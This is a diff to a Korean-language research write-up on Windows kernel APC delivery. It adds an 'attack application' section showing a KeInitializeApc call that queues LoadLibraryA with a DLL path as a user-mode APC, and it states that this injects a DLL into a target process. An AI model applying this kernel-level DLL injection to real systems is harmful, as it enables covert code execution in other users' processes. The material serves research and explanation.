@@ -36,6 +36,7 @@
 - [PoC 커널 및 유저모드 코드 해설](#poc-커널-및-유저모드-코드-해설)
 - [자원 관리와 안정성 검토](#자원-관리와-안정성-검토)
 - [결론과 한계](#결론과-한계)
+- [공격 응용]()
 - [참고 문헌](#참고-문헌)
 
 ---
@@ -1442,6 +1443,36 @@ static VOID ReleaseOwnershipDemo(POWNERSHIP_DEMO state)
 
 > [!IMPORTANT]
 > 이 연구를 **“Special User APC를 완전히 대체한다”** 또는 **“KernelMode APC는 언제나 즉시 실행된다”**로 확대 해석하지 않습니다. 현재 자료로 뒷받침되는 결론은 **정해진 테스트 환경에서 일반 User APC의 명시적 alertable wait 없는 전달을 관찰했다**는 것입니다.
+
+---
+
+## 공격 응용
+
+### 공격자가 원하는 유저 함수를 호출할 수 있음.
+
+#### 커널 코드에서 UserMode APC를 통하여 LoadLibraryA를 사용하려는 경우..
+
+#### Example)
+
+LoadLibraryA Address : 00007FFFC7EA2C80
+
+DLL PATH STRING Address: 00007FF65D5DD0A8
+
+```cpp
+KeInitializeApc(
+    Uapc,
+    (PRKTHREAD)thread,
+    OriginalApcEnvironment,
+    ApcKernelRoutine,                       // Kernel routine
+    ApcRundownRoutine,                       // Rundown routine
+    (PKNORMAL_ROUTINE)0x00007FFFC7EA2C80,       // LoadLibraryA 주소
+    UserMode,                                // 커널모드는 Alertable no 상태에서  APC
+    (PUCHAR)0x00007FF65D5DD0A8               // NormalContext , but DLL PATH 주소
+);
+```
+위와 같이 *NORMAL_ROUTINE*에서는 `LoadLibraryA`의 주소를 작성, *NORMAL_CONTEXT*에서는 `(ANSI)Dll Path String`의 주소 값을 작성할 수 있다.
+
+이렇게 진행한 경우,, dll 이 주입됩니다.
 
 ---
 
